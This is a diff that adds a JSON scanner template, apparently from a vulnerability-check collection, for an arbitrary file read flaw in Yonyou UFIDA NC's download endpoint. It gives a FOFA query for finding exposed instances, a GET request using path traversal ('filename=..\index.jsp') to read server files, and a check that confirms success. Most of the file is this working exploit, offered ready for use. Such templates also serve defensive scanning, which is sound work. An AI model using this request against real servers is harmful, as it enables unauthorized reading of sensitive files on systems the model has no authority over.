@@ -1,0 +1,33 @@
+{
+  "product": "用友UFIDA NC",
+  "vul_name": "用友UFIDA NC download文件读取漏洞",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC的download文件存在任意文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-UFIDA-NC\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17764545.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/portal/pt/xml/file/download?pageId=login&filename=..\\index.jsp"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "response.addHeader"
+        }
+      ]
+    }
+  }
+}
